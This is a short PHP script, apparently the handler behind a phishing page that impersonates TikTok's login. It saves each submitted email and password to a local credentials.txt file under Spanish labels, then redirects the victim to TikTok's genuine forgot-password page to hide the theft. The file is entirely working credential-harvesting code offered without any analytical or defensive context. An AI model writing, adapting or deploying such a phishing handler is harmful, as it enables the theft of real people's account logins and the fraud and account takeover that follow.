<?php

file_put_contents("credentials.txt", "[+] Tiktok -> Usuario: " . $_POST['email'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.tiktok.com/login/email/forget-password');
exit();
?>
